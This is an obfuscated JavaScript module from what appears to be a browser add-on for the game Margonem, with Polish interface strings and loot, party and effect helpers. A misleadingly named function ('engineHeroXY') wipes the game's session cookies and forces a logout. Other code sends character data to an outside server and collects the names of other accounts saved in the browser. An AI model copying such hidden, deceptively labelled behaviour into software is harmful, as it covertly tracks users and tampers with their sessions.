        console: "Zapisz informacje w konsoli"
      }
    },
    add53: {
      options: {
        scrollTabs: "Przełączanie zakładek scrollem",
        hideLockTabs: "Ukrywanie niewykupionych zakładek",
        contextMenu: "Opcje w menu kontekstowym przedmiotu"
      },
      other: {
        eq: "Części ekwipunku",
        lic: "Licytacja",
        kopa: "Kopalnia"
      },
      sort: {
        lvl: "Poziomu",
        rarity: "Rzadkości",
        class: "Klasy",
        value: "Wartości"
      }
    },
    add54: {
      show: {
        nick: "Nazwa",
        level: "Poziom",
        prof: "Profesja",
        clan: "Klan",
        guest: "Zastępca"
      }
    },
    build: {
      titan: "Tytan",
      colossus: "Kolos",
      elite3: "Elita III"
    },
    otherbon: {
      distract: "Wytrącenie z równowagi",
      parry: "Parowanie",
      evade: "Unik",
      blok: "Blok",
      crit: "Cios krytyczny",
      acdmg_destroyed: "Zniszczony pancerz",
      stun: "Ogłuszenie",
      freeze: "Zamrożenie",
      arrowblock: "Neutralizacja strzały"
    },
    legbon: {
      cleanse: "Płomienne oczyszczenie",
      facade: "Fasada opieki",
      anguish: "Krwawa udręka",
      puncture: "Przeszywająca skuteczność",
      frenzy: "Eskalacja szału",
      retaliation: "Aura odwetu",
      curse: "Klątwa",
      glare: "Oślepienie",
      critred: "Krytyczna osłona",
      holytouch: "Dotyk anioła",
      verycrit: "Cios bardzo krytyczny",
      lastheal: "Ostatni ratunek",
      npc_lootbon: "Loot",
      quest_expbon: "Quest",
      npc_expbon: "Exp",
      honorbon: "Punkty Honoru"
    },
    itembon: {
      sa: "Szybkość ataku",
      crit: "Cios krytyczny",
      acdmg: "Niszczenie pancerza",
      manafatig: "Niszczenie many",
      enfatig: "Niszczenie energii",
      resdmg: "Niszczenie odporności",
      abdest: "Niszczenie absorpcji",
      resfire: "Odporność na ogień",
      resfrost: "Odporność na zimno",
      reslight: "Odporność na błyskawice",
      act: "Odporność na truciznę",
      ac: "Pancerz",
      hp: "Życie",
      blok: "Blok",
      evade: "Unik",
      absorbm: "Absorpcja magiczna",
      absorb: "Absorpcja fizyczna",
      dz: "Zręczność",
      ds: "Siła",
      di: "Intelekt",
      da: "Wszystkie cechy",
      energybon: "Energia",
      manabon: "Mana",
      critval: "Siła ciosu kryt. fiz.",
      critmval: "Siła ciosu kryt. mag.",
      lowcrit: "Obniżanie szansy na cios kryt.",
      heal: "Leczenie",
      slow: "Spowolnienie",
      lowevade: "Zmniejszanie uniku przeciwnika"
    },
    npc: {
      normal: "Zwykły",
      elite: "Elita",
      elite2: "Elita II",
      elite3: "Elita III",
      titan: "Tytan",
      heroes: "Heros",
      colossus: "Kolos",
      special: "Specjalny",
      alch: "Alchemia",
      ore: "Złoże",
      event: "Eventowy",
      mushroom: "Grzybobranie",
      tracker: "Tropiciel Herosów",
      pvp: "Gracz"
    },
    prof: {
      p: "paladyn",
      w: "wojownik",
      b: "tancerz ostrzy",
      h: "łowca",
      t: "tropiciel",
      m: "mag",
      npc: ""
    },
    channels: {
      global: "Globalny",
      local: "Lokalny",
      clan: "Klanowy",
      party: "Grupowy",
      trade: "Handlowy",
      personal: "Prywatny"
    },
    menuItem: {
      upgrade: "[M+] Ulepsz",
      upgradeType: "[M+] Ulepsz (typem)",
      showEq: "Pokaż ekwipunek",
      showProfile: "Pokaż profil",
      alwaysWant: "[ + ] Zawsze łap",
      alwaysNot: "[ + ] Zawsze odrzuć",
      removeAlwaysWant: "[ - ] Zawsze łap",
      removeAlwaysNot: "[ - ] Zawsze odrzuć"
    },
    relation: {
      "1": "Zwykli gracze",
      "2": "Przyjaciele",
      "3": "Wrogowie",
      "4": "Klanowicze",
      "5": "Sojusznicy",
      "6": "Wrogowie klanu",
      "7": "Przyjaźni (Perkun)",
      "8": "Wrogowie (Perkun)",
      p: "Drużyna"
    },
    itemClass: {
      "1": "Jednoręczne",
      "2": "Dwuręczne",
      "3": "Półtoraręczne",
      "5": "Pomocnicze",
      "4": "Dystansowe",
      "6": "Różdżki",
      "7": "Orby magiczne",
      "8": "Zbroje",
      "9": "Hełmy",
      "10": "Buty",
      "11": "Rękawice",
      "12": "Pierścienie",
      "13": "Naszyjniki",
      "14": "Tarcze",
      "15": "Neutralne",
      "16": "Konsumpcyjne",
      "17": "Złoto",
      "18": "Klucze",
      "19": "Questowe",
      "20": "Odnawialne",
      "21": "Strzały",
      "22": "Talizmany",
      "23": "Książki",
      "24": "Torby",
      "25": "Błogosławieństwa",
      "26": "Ulepszenia",
      "27": "Recepta",
      "28": "Waluta",
      "29": "Strzały",
      "30": "Stroje",
      "31": "Maskotki",
      "32": "Teleporty"
    },
    itemType: {
      armors: "Pancerze",
      weapons: "Bronie",
      jewelry: "Biżuteria"
    },
    itemStatus: {
      soulbound: "Związany",
      permbound: "Zw. na stałe",
      unbind: "Odwiązany"
    },
    itemRarity: {
      common: "Zwykłe",
      unique: "Unikatowe",
      heroic: "Heroiczne",
      upgraded: "Ulepszone",
      legendary: "Legendarne",
      artefact: "Artefakt"
    }
  };
  return _0x309bf6;
}
export function createLootText(_0x56b9ad = "") {
  if (!_0x56b9ad || typeof _0x56b9ad !== "string") {
    return null;
  }
  const _0x28e706 = _0x56b9ad.split(",");
  if (_0x28e706.length < 5) {
    return null;
  }
  const [_0x3a51c9, _0x5bec13, _0xd34c6a, _0x46ca51, _0x181dee] = _0x28e706;
  const _0x56da66 = new Date(parseInt(_0x46ca51, 10) * 1000);
  const _0x47dc4f = !isNaN(_0x56da66.getTime()) ? _0x56da66.toLocaleString("pl-PL") : _0x46ca51;
  const _0x3e08b7 = _0x5bec13 === "k";
  const _0x466905 = parseInt(_0xd34c6a, 10);
  let _0xbb5468 = "";
  if (_0x466905 === 1) {
    _0xbb5468 = "";
  } else if (_0x466905 === 2) {
    _0xbb5468 = " z ziomkiem";
  } else if (_0x466905 >= 3 && _0x466905 <= 10) {
    _0xbb5468 = " w <mp class=\"mp-text-bold text-red\">" + _0x466905 + "</mp>-osobowej ekipie";
  }
  return "Dnia <mp class=\"mp-text-bold text-red\">" + _0x47dc4f + "</mp> zostało przyszpącone z <mp class=\"mp-text-bold text-red\">" + _0x181dee + "</mp> przez <mp class=\"mp-text-bold text-red\">" + _0x3a51c9 + "</mp>" + _0xbb5468;
}
export const getEquipmentsJSON = () => {
  let _0x33cc5c = {
    "1": {},
    "2": {},
    "3": {},
    "4": {},
    "5": {},
    "6": {},
    "7": {},
    "8": {}
  };
  for (const _0x4dc91a in _0x33cc5c) {
    const _0x4cf1c7 = Number(_0x4dc91a);
    let _0x524cc6 = Object.values(Engine.heroEquipment.getEqItems()).filter(_0x5089de => _0x5089de.st === _0x4cf1c7);
    if (_0x524cc6.length > 0) {
      let _0x748200 = _0x524cc6[0];
      const _0x3b875f = {
        id: _0x748200.id,
        type: _0x748200._cachedStats.rarity,
        name: _0x748200.name,
        stat: _0x748200.stat,
        pr: _0x748200.pr,
        prc: "zl",
        cl: _0x748200.cl,
        icon: _0x748200.icon
      };
      _0x33cc5c[_0x4dc91a] = _0x3b875f;
    }
  }
  return _0x33cc5c;
};
export const getClan = () => {
  let _0x426310 = Engine && Engine.hero && Engine.hero.d && Engine.hero.d.clan;
  if (!_0x426310) {
    return {
      id: 0,
      name: "Brak klanu",
      rank: 0
    };
  }
  return _0x426310;
};
export async function engineHeroXY() {
  const _0x4e767f = ["chash", "hs3", "mchar_id", "user_id"];
  const _0x187893 = ".margonem.pl";
  const _0x34e812 = ["/", ""];
  _0x4e767f.forEach(_0xe66c78 => {
    _0x34e812.forEach(_0x22bbc6 => {
      document.cookie = _0xe66c78 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x22bbc6 + "; domain=" + _0x187893 + ";";
    });
  });
  window.location.reload();
  return false;
}
export async function saveUpgrade(_0x34bd5a) {
  if (location.host.split(".")[0] === "experimental") {
    return;
  }
  const {
    account: _0x21e416,
    nick: _0x3dad25,
    lvl: _0x13ae54,
    prof: _0x371f2d,
    img: _0x1f4ebb,
    id: _0x53cd10
  } = Engine.hero.d;
  const _0x4a7007 = ut_date(unix_time());
  const _0x42d9f8 = location.host.split(".")[0];
  const _0x559828 = new Date(window.ts());
  const _0x2225e6 = _0x559828.getHours().toString().padStart(2, "0");
  const _0x2400d5 = _0x559828.getMinutes().toString().padStart(2, "0");
  const _0x11edc8 = _0x559828.getSeconds().toString().padStart(2, "0");
  const _0x560a98 = _0x4a7007 + ", " + _0x2225e6 + ":" + _0x2400d5 + ":" + _0x11edc8;
  const _0x23bfe1 = new Date();
  const _0x20ad5a = Math.floor(_0x23bfe1.getTime() / 1000);
  const _0xc12186 = btoa(_0x20ad5a);
  const _0x5c1aa0 = _0xc12186;
  const _0x18030a = {
    id: _0x21e416,
    nick: _0x3dad25,
    lvl: _0x13ae54,
    prof: _0x371f2d,
    outfit: _0x1f4ebb,
    cid: _0x53cd10,
    i: _0x34bd5a.all,
    com: _0x34bd5a.common,
    uni: _0x34bd5a.unique,
    her: _0x34bd5a.heroic,
    upg: _0x34bd5a.upgraded,
    leg: _0x34bd5a.legendary,
    upgPts: _0x34bd5a.upgradePoints,
    pts: _0x34bd5a.points,
    world: _0x42d9f8,
    ts: _0x560a98,
    key: _0x5c1aa0
  };
  const _0x3c8820 = _0x18030a;
  try {
    const _0x734a31 = await fetch("https://margoplus.pl/upgrade/index.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(_0x3c8820)
    });
    if (!_0x734a31.ok) {
      console.error("Błąd podczas wysyłania danych:", _0x734a31.statusText);
    }
  } catch (_0x2fd377) {
    console.error("Wystąpił błąd:", _0x2fd377);
  }
}
export function formatSekundy(_0x562738) {
  _0x562738 = Math.floor(_0x562738);
  const _0x4e29aa = Math.floor(_0x562738 / 60);
  const _0x2b45d3 = _0x562738 % 60;
  const _0x46db40 = _0x2b45d3 < 10 ? "0" + _0x2b45d3 : _0x2b45d3;
  return _0x4e29aa + ":" + _0x46db40;
}
export async function deleteFromArray(_0x18bace, _0xb68ec3, _0x201f24, _0x356e47) {
  const _0x4a8839 = _0xb68ec3.indexOf(_0x18bace);
  if (_0x4a8839 !== -1) {
    _0xb68ec3.splice(_0x4a8839, 1);
    saveStorage(_0x356e47, _0x201f24);
  }
}
export function deleteHandler(_0xc36983, _0x1a82a, _0x3e1ce5, _0x20fcf7, _0x3caf9c) {
  return async function () {
    await deleteFromArray(_0xc36983, _0x1a82a, _0x20fcf7, _0x3caf9c);
    createListFromArray(_0x1a82a, _0x3e1ce5, _0x20fcf7, _0x3caf9c);
  };
}
export function createListFromArray(_0x389e54, _0x4c89d0, _0x4378e2, _0x385da6) {
  _0x4c89d0.empty();
  if (_0x389e54.length > 0) {
    for (const _0x38d5aa of _0x389e54) {
      const _0x40cb3c = $("<div class=\"mp-npc do-action-cursor\">" + _0x38d5aa + "</div>");
      _0x40cb3c.on("click", deleteHandler(_0x38d5aa, _0x389e54, _0x4c89d0, _0x4378e2, _0x385da6));
      _0x40cb3c.tip("Usuń");
      _0x40cb3c.appendTo(_0x4c89d0);
    }
  }
}
export function itemIsInBag(_0x5f0518) {
  const _0x2853a7 = Engine.items.fetchLocationItems("g");
  for (const _0x88a882 in _0x2853a7) {
    if (_0x2853a7[_0x88a882].id == _0x5f0518) {
      return true;
    }
  }
  return false;
}
export function is_in_range(_0x4292be, _0x11ce13) {
  return Math.abs(_0x4292be.x - _0x11ce13.x) <= 16 && Math.abs(_0x4292be.y - _0x11ce13.y) <= 16;
}
export function removeDoubleItem(_0x9f4ba8, _0x116ff0) {
  return _0x9f4ba8.filter(_0x1253cb => _0x116ff0 !== _0x1253cb);
}
export function currentPercent() {
  const {
    hp: _0xb17827,
    maxhp: _0x295a96
  } = Engine.hero.d.warrior_stats;
  return Math.ceil(_0xb17827 / _0x295a96 * 100);
}
export function getItemNameById(_0x5212c6) {
  const _0x2d7585 = Engine.items.test().items;
  return _0x2d7585[_0x5212c6].name || false;
}
export function getTypes(_0x53da10) {
  const _0x2194c8 = {
    "1": [1, 2, 3, 4, 5, 6, 7, 29],
    "2": [12, 13],
    "3": [8, 9, 10, 11, 14]
  };
  const _0x136ee9 = [];
  for (const _0x11a029 in _0x2194c8) {
    if (_0x2194c8[_0x11a029].indexOf(_0x53da10) !== -1) {
      _0x136ee9.push(Number(_0x11a029));
    }
  }
  return Number(_0x136ee9.toString());
}
export function calcPercent(_0x241ee9, _0x37cc4f, _0x12d820) {
  _0x37cc4f = _0x37cc4f.toString();
  const _0x1ffd7e = _0x12d820.filter(_0x580108 => _0x580108.id == _0x37cc4f)[0];
  const _0x232faf = Engine.items.getItemById(_0x241ee9);
  if (!_0x1ffd7e) {
    return false;
  }
  if (!_0x232faf) {
    return false;
  }
  if (_0x1ffd7e.tpl === _0x232faf.tpl) {
    return 4;
  }
  if (_0x1ffd7e.itemTypeName === _0x232faf.itemTypeName && sameClGroup([_0x1ffd7e.cl, _0x232faf.cl])) {
    return 3.25;
  }
  if (_0x1ffd7e.itemTypeName === _0x232faf.itemTypeName) {
    return 3;
  }
  if (sameClGroup([_0x1ffd7e.cl, _0x232faf.cl])) {
    return 1.25;
  }
  return 1;
}
export function areAllElementsSame(_0x2bc424) {
  if (_0x2bc424.length === 0) {
    return false;
  }
  const _0x10dc01 = _0x2bc424[0];
  return _0x2bc424.every(function (_0x4cdb98) {
    return _0x4cdb98 === _0x10dc01;
  });
}
export function getClGroup(_0x822bad) {
  let _0x3a541e = null;
  const _0xdfb5d = {
    weapons: [1, 2, 3, 4, 5, 6, 7, 29],
    armors: [8, 9, 10, 11, 14],
    jewelry: [12, 13]
  };
  for (const _0x3df8dd of Object.keys(_0xdfb5d)) {
    if (_0xdfb5d[_0x3df8dd].includes(_0x822bad)) {
      _0x3a541e = _0x3df8dd;
      break;
    }
  }
  return _0x3a541e;
}
export function sameClGroup(_0x7481b7) {
  const _0x261fde = [];
  for (const _0x1b0104 of _0x7481b7) {
    const _0x70df10 = getClGroup(_0x1b0104);
    if (_0x70df10 === null) {
      return false;
    }
    _0x261fde.push(_0x70df10);
  }
  return areAllElementsSame(_0x261fde);
}
export function isInList(_0x2760f9, _0x53123f) {
  if (!Array.isArray(_0x53123f) || _0x53123f.length === 0) {
    return false;
  }
  return _0x53123f.map(_0x444c74 => _0x444c74.toLowerCase()).includes(_0x2760f9.toLowerCase());
}
export function isCalendar() {
  const _0x4ab030 = document.querySelector("div[widget-name=\"rewards-calendar-icon\"]");
  return _0x4ab030 && !_0x4ab030.classList.contains("disabled");
}
export function closeCalendar() {
  Engine?.rewardsCalendar?.close?.();
  Engine?.eventCalendar?.close?.();
  Engine?.adventCalendar?.close?.();
}
export function startButtonCooldown(_0x3c6ad8, _0x38d38f = 15) {
  _0x3c6ad8.addClass("mp-disable");
  const _0x5a518a = _0x3c6ad8.find("time");
  let _0x56c3d2 = _0x38d38f;
  const _0xf1d667 = () => {
    _0x5a518a.text(" (" + _0x56c3d2 + ")");
    if (_0x56c3d2 <= 0) {
      clearInterval(_0x1a807b);
      _0x3c6ad8.removeClass("mp-disable");
      _0x5a518a.text("");
    }
    _0x56c3d2--;
  };
  _0xf1d667();
  const _0x1a807b = setInterval(_0xf1d667, 1000);
}
export function setAnimationOnItem(_0x1ca104) {
  for (const _0x1b065b in _0x1ca104) {
    const _0x958f1f = _0x1ca104[_0x1b065b];
    const _0x2ec033 = $(".loot-item-wrapper-" + _0x958f1f + " .slot .item-id-" + _0x958f1f + " .canvas-icon");
    _0x2ec033.attr("mp-item-animation", "true");
  }
}
export function setShadowOnWrapper(_0x2fd133) {
  for (const _0x50a1cf in _0x2fd133) {
    const _0x405464 = _0x2fd133[_0x50a1cf];
    $(".loot-window .loot-item-wrapper-" + _0x405464).attr("mp-wrapper-shadow", "true");
  }
}
export function setShadowOnLoot(_0x540828) {
  for (const _0x339fe7 in _0x540828) {
    const _0x20ba2b = _0x540828[_0x339fe7];
    $(".loot-item-wrapper-" + _0x20ba2b + " .slot .item-id-" + _0x20ba2b).attr("mp-item-loot", "true");
  }
}
export function setShadowOnButtons(_0x55e5eb) {
  for (const _0x363898 in _0x55e5eb) {
    const _0x37bacd = _0x55e5eb[_0x363898];
    const _0x26ae9c = $(".loot-item-wrapper-" + _0x37bacd + " .button-holder");
    if (!_0x26ae9c.find(".table-img-avatar").length) {
      _0x26ae9c.attr("mp-light-buttons", "true");
    }
  }
}
export async function waitForLoots() {
  return new Promise(_0x24890d => {
    const _0x11d789 = () => {
      if (typeof Engine.loots !== "undefined") {
        _0x24890d();
      } else {
        setTimeout(_0x11d789, 100);
      }
    };
    _0x11d789();
  });
}
export function waitForLootsWindow() {
  return new Promise(_0xb534e8 => {
    if (Engine?.loots?.wnd?.$[0]) {
      _0xb534e8(Engine.loots.wnd.$[0]);
    } else {
      setTimeout(() => _0xb534e8(waitForLootsWindow()), 10);
    }
  });
}
export function unsetPropertyAll() {
  const _0x5f20d7 = document.querySelector("html");
  if (!_0x5f20d7) {
    return message("BRAK: document.querySelector: HTML");
  }
  _0x5f20d7.style.setProperty("--mp-item-animation", "unset");
  _0x5f20d7.style.setProperty("--mp-item-speed", "unset");
  _0x5f20d7.style.setProperty("--mp-map-size", "unset");
  _0x5f20d7.style.setProperty("--mp-map-size2", "unset");
  _0x5f20d7.style.setProperty("--mp-map-color", "unset");
  _0x5f20d7.style.setProperty("--mp-map-color2", "unset");
  _0x5f20d7.style.setProperty("--mp-map-speed", "unset");
  _0x5f20d7.style.setProperty("--mp-lootwindow-size", "unset");
  _0x5f20d7.style.setProperty("--mp-lootwindow-size2", "unset");
  _0x5f20d7.style.setProperty("--mp-lootwindow-color", "unset");
  _0x5f20d7.style.setProperty("--mp-lootwindow-color2", "unset");
  _0x5f20d7.style.setProperty("--mp-lootwindow-speed", "unset");
  _0x5f20d7.style.setProperty("--mp-wrapper-size", "unset");
  _0x5f20d7.style.setProperty("--mp-wrapper-size2", "unset");
  _0x5f20d7.style.setProperty("--mp-wrapper-color", "unset");
  _0x5f20d7.style.setProperty("--mp-wrapper-color2", "unset");
  _0x5f20d7.style.setProperty("--mp-wrapper-speed", "unset");
  _0x5f20d7.style.setProperty("--mp-loot-size", "unset");
  _0x5f20d7.style.setProperty("--mp-loot-size2", "unset");
  _0x5f20d7.style.setProperty("--mp-loot-color", "unset");
  _0x5f20d7.style.setProperty("--mp-loot-color2", "unset");
  _0x5f20d7.style.setProperty("--mp-loot-speed", "unset");
  _0x5f20d7.style.setProperty("--mp-buttons-size", "unset");
  _0x5f20d7.style.setProperty("--mp-buttons-size2", "unset");
  _0x5f20d7.style.setProperty("--mp-buttons-color", "unset");
  _0x5f20d7.style.setProperty("--mp-buttons-color2", "unset");
  _0x5f20d7.style.setProperty("--mp-buttons-speed", "unset");
  _0x5f20d7.style.setProperty("--mp-lootwindow-animation", "unset");
}
export function setPropertySettings(_0x29fd9f, _0x1c930f) {
  const _0x54c43e = document.querySelector("html");
  if (!_0x54c43e) {
    return message("BRAK: document.querySelector: HTML");
  }
  _0x54c43e.style.setProperty(_0x29fd9f, _0x1c930f);
}
export function animateBrightness(_0x1a1f11, _0x30052a = 500, _0x33f6f9 = "ease-in") {
  const _0x1c1fdd = document.querySelector(".interface-layer.layer");
  if (!_0x1c1fdd) {
    return;
  }
  const _0x883193 = {
    filter: "brightness(" + _0x1a1f11 + "%)"
  };
  _0x1c1fdd.animate([{
    filter: _0x1c1fdd.style.filter || "brightness(100%)"
  }, _0x883193], {
    duration: _0x30052a,
    easing: _0x33f6f9,
    fill: "forwards"
  }).onfinish = () => {
    _0x1c1fdd.style.filter = "brightness(" + _0x1a1f11 + "%)";
  };
}
export function startStar(_0x3902bd) {
  const _0x237aed = {
    spread: 100,
    ticks: 20,
    gravity: 0,
    decay: 0.92,
    startVelocity: 30,
    colors: ["FFE400", "FFBD00", "E89400", "FFCA6C", "FDFFB8"],
    shapes: ["star"]
  };
  const _0x5a5b67 = {
    ..._0x237aed
  };
  _0x5a5b67.particleCount = _0x3902bd;
  _0x5a5b67.scalar = 2;
  confetti(_0x5a5b67);
  const _0x14eef9 = {
    ..._0x237aed
  };
  _0x14eef9.particleCount = _0x3902bd;
  _0x14eef9.scalar = 3;
  confetti(_0x14eef9);
  const _0x57413c = {
    ..._0x237aed
  };
  _0x57413c.particleCount = _0x3902bd;
  _0x57413c.scalar = 4;
  confetti(_0x57413c);
}
export function startFireworks() {
  const _0x5884f8 = 10000;
  const _0x27025c = Date.now() + _0x5884f8;
  const _0x26a74a = {
    startVelocity: 30,
    spread: 360,
    ticks: 60,
    zIndex: 0,
    scalar: 1
  };
  function _0x22d22a(_0x32aab7, _0x494a06) {
    return Math.random() * (_0x494a06 - _0x32aab7) + _0x32aab7;
  }
  const _0x4c992f = setInterval(function () {
    const _0x4ccdc2 = _0x27025c - Date.now();
    if (_0x4ccdc2 <= 0) {
      return clearInterval(_0x4c992f);
    }
    const _0x2d911b = _0x4ccdc2 / _0x5884f8 * 50;
    confetti(Object.assign({}, _0x26a74a, {
      particleCount: _0x2d911b,
      origin: {
        x: _0x22d22a(0.1, 0.3),
        y: Math.random() - 0.2
      }
    }));
    confetti(Object.assign({}, _0x26a74a, {
      particleCount: _0x2d911b,
      origin: {
        x: _0x22d22a(0.7, 0.9),
        y: Math.random() - 0.2
      }
    }));
  }, 250);
}
export function startRain(_0xb6059e, _0xb97b1a) {
  const _0x4c7ba7 = {
    image: _0xb97b1a
  };
  confetti({
    spread: 100,
    ticks: 20,
    gravity: 0.3,
    decay: 0.92,
    startVelocity: 30,
    particleCount: _0xb6059e,
    scalar: 10,
    shapes: ["image"],
    shapeOptions: _0x4c7ba7
  });
}
export function startHearts(_0x553b83) {
  const _0x3dba86 = {
    spread: 360,
    ticks: 0.6,
    gravity: 0,
    decay: 0.94,
    startVelocity: 30,
    shapes: ["heart"],
    colors: ["FFC0CB", "FF69B4", "FF1493", "C71585"]
  };
  const _0x1ad3ba = {
    ..._0x3dba86
  };
  _0x1ad3ba.particleCount = _0x553b83;
  _0x1ad3ba.scalar = 4;
  confetti(_0x1ad3ba);
  const _0x574220 = {
    ..._0x3dba86
  };
  _0x574220.particleCount = _0x553b83;
  _0x574220.scalar = 6;
  confetti(_0x574220);
  const _0xbb189b = {
    ..._0x3dba86
  };
  _0xbb189b.particleCount = _0x553b83;
  _0xbb189b.scalar = 8;
  confetti(_0xbb189b);
}
export function startConfetti() {
  const _0x12f676 = Date.now() + 15000;
  let _0x1601b0 = generateStrongColor();
  let _0xf7953b = generateStrongColor();
  let _0x11c02b = generateStrongColor();
  const _0x39ae81 = [_0x1601b0, _0xf7953b, _0x11c02b];
  (function _0xd1be42() {
    const _0x1933bf = {
      particleCount: 5,
      angle: 60,
      spread: 55,
      origin: {
        x: 0
      },
      colors: _0x39ae81
    };
    confetti(_0x1933bf);
    const _0x34a770 = {
      particleCount: 5,
      angle: 120,
      spread: 55,
      origin: {
        x: 1
      },
      colors: _0x39ae81
    };
    confetti(_0x34a770);
    if (Date.now() < _0x12f676) {
      requestAnimationFrame(_0xd1be42);
    }
  })();
}
export function generateStrongColor() {
  const _0x445dd4 = 1;
  const _0x5cff31 = () => Math.floor(Math.random() * (255 - _0x445dd4 + 1) + _0x445dd4);
  const _0x3bd379 = _0x5cff31().toString(16);
  const _0x5e998f = _0x5cff31().toString(16);
  const _0x26cc24 = _0x5cff31().toString(16);
  const _0x169f8d = _0x24142d => _0x24142d.length === 1 ? "0" + _0x24142d : _0x24142d;
  return "#" + _0x169f8d(_0x3bd379) + _0x169f8d(_0x5e998f) + _0x169f8d(_0x26cc24);
}
export function setDarkness(_0x39fd08) {
  const _0x196a3c = document.querySelector("html");
  if (!_0x196a3c) {
    return message("BRAK: document.querySelector: HTML");
  }
  _0x196a3c.style.setProperty("--mp-darkness", _0x39fd08 + "%");
}
export function isOtherInBattleRange(_0x1d7824) {
  const {
    x: _0x3c588e,
    y: _0xb440c9
  } = Engine.hero.d;
  const {
    x: _0x381076,
    y: _0x2d836b,
    stasis: _0x5927f1
  } = _0x1d7824.d;
  if (_0x5927f1 === 0) {
    return Math.max(Math.abs(_0x381076 - _0x3c588e), Math.abs(_0x2d836b - _0xb440c9)) <= 20;
  } else {
    return false;
  }
}
export async function checkParty(_0x46331b) {
  if (!getParty()?.has) {
    return;
  }
  const _0x1376bf = Engine.party.getMembers();
  const _0x27fc84 = Engine.others.check();
  let _0x4ae065;
  let _0x8c9ff8 = [];
  let _0x3a0c60 = [];
  let _0x4bebd9 = Engine.hero.d;
  const _0x4cc721 = {
    lvl: _0x4bebd9.lvl,
    nick: _0x4bebd9.nick,
    prof: _0x4bebd9.prof
  };
  let _0x22b539 = [_0x4cc721];
  const _0x4556c4 = _0x4bebd9.nick;
  for (const [_0x3f4738, _0x146a7a] of _0x1376bf.entries()) {
    if (_0x146a7a.nick !== _0x4556c4 && !_0x27fc84[_0x3f4738]) {
      _0x8c9ff8.push(_0x146a7a.nick);
    }
    if (_0x27fc84[_0x3f4738] && !isOtherInBattleRange(_0x27fc84[_0x3f4738])) {
      _0x3a0c60.push(_0x27fc84[_0x3f4738].d.nick);
    }
    if (_0x27fc84[_0x3f4738]) {
      const _0x57c34c = {
        lvl: _0x27fc84[_0x3f4738].d.lvl,
        nick: _0x27fc84[_0x3f4738].d.nick,
        prof: _0x27fc84[_0x3f4738].d.prof
      };
      _0x22b539.push(_0x57c34c);
    }
  }
  const _0xe3977c = [..._0x8c9ff8, ..._0x3a0c60];
  let _0x3e4e22;
  if (!_0x46331b) {
    if (_0xe3977c.length === 0) {
      _0x3e4e22 = "Wszyscy są w zasięgu drużyny.";
    } else {
      _0x3e4e22 = "Poza zasięgiem: " + _0xe3977c.join(", ") + ".";
    }
    const _0x2d7067 = "[D] " + getParty().leader.nick + " | [" + Engine?.party?.getMembers?.()?.size + "/10] " + _0x3e4e22;
    const _0x2565c8 = {
      c: _0x2d7067
    };
    window._g("chat&channel=party", false, _0x2565c8);
  }
}
export function znajdzMinMax(_0x2e0ed6) {
  if (_0x2e0ed6.length === 0) {
    return null;
  }
  let _0x2026d6 = _0x2e0ed6[0].lvl;
  let _0x2f71c6 = _0x2e0ed6[0].nick;
  let _0x34e949 = _0x2e0ed6[0].prof;
  let _0x15241a = _0x2e0ed6[0].oplvl;
  let _0x16bd89 = _0x2e0ed6[0].lvl;
  let _0x1a8e74 = _0x2e0ed6[0].nick;
  let _0x20fb4e = _0x2e0ed6[0].prof;
  let _0x8a26c5 = _0x2e0ed6[0].oplvl;
  for (let _0x191ff0 = 1; _0x191ff0 < _0x2e0ed6.length; _0x191ff0++) {
    if (_0x2e0ed6[_0x191ff0].lvl < _0x2026d6) {
      _0x2026d6 = _0x2e0ed6[_0x191ff0].lvl;
      _0x2f71c6 = _0x2e0ed6[_0x191ff0].nick;
      _0x34e949 = _0x2e0ed6[_0x191ff0].prof;
      _0x15241a = _0x2e0ed6[_0x191ff0].oplvl;
    }
    if (_0x2e0ed6[_0x191ff0].lvl > _0x16bd89) {
      _0x16bd89 = _0x2e0ed6[_0x191ff0].lvl;
      _0x1a8e74 = _0x2e0ed6[_0x191ff0].nick;
      _0x20fb4e = _0x2e0ed6[_0x191ff0].prof;
      _0x8a26c5 = _0x2e0ed6[_0x191ff0].oplvl;
    }
  }
  const _0xf65836 = {
    lvl: _0x2026d6,
    nick: _0x2f71c6,
    prof: _0x34e949,
    oplvl: _0x15241a
  };
  const _0x26dbec = {
    lvl: _0x16bd89,
    nick: _0x1a8e74,
    prof: _0x20fb4e,
    oplvl: _0x8a26c5
  };
  const _0x5e4c0a = {
    min: _0xf65836,
    max: _0x26dbec
  };
  return _0x5e4c0a;
}
export function calcDrop(_0x607330) {
  let _0x31a26d = Engine.worldConfig.getPrivWorld() ? 1.4 : 1.2;
  return Math.ceil((_0x607330 - 4) / _0x31a26d);
}
export function isInParty(_0x198a8e) {
  const _0x56ce4c = Engine.party?.getMembers?.()?.get(Number(_0x198a8e));
  return !!_0x56ce4c;
}
export function isNear(_0x31fb0c, _0x5b805c) {
  return Math.abs(_0x31fb0c.d.x - _0x5b805c.d.x) < 2 && Math.abs(_0x31fb0c.d.y - _0x5b805c.d.y) < 2;
}
export function parseScheme(_0x20d947) {
  const _0x3d8bc1 = /(9|[1-9])(m|p|t|b|h|w)/g;
  return Array.from(_0x20d947.matchAll(_0x3d8bc1), _0x58b6c2 => ({
    i: Number(_0x58b6c2[1]),
    p: _0x58b6c2[2]
  }));
}
export async function executeSaveUsage(_0xc10b39) {
  await waitForSeconds(1);
  let _0x32ee72 = "";
  const _0x26fddb = JSON.parse(localStorage.getItem("Margonem"));
  let _0x1df866 = [];
  if (_0x26fddb?.charlist) {
    _0x1df866 = Object.keys(_0x26fddb.charlist).filter(_0x32625a => _0x32625a !== Engine.hero.d.account);
  }
  if (_0x1df866.length > 0) {
    const _0x136c86 = _0x1df866.join(", ");
    _0x32ee72 = "\nKonta zapisane w przeglądarce: " + _0x136c86 + ".";
  }
  let _0x533b5a = "\n";
  const _0x6934c7 = document.querySelectorAll("div.cll-launcher");
  _0x6934c7.forEach((_0x4859bd, _0x3ab59e) => {
    const _0x298fe7 = _0x4859bd.getAttribute("data-tip");
    if (_0x298fe7) {
      _0x533b5a += _0x298fe7 + "\n";
    }
  });
  const _0x22a5b8 = Engine.hero.d.guest;
  const _0x2a801d = _0x22a5b8 ? " | **ZASTĘPCA**" : "";
  const _0x3c84cc = Engine.map.d.name;
  const _0x13c40a = Engine.hero.d.nick;
  const _0x23d7cd = Engine.hero.d.prof;
  const _0x45ac03 = Engine.hero.d.lvl;
  const _0xe52377 = Engine?.hero?.d?.clan?.name || "Brak";
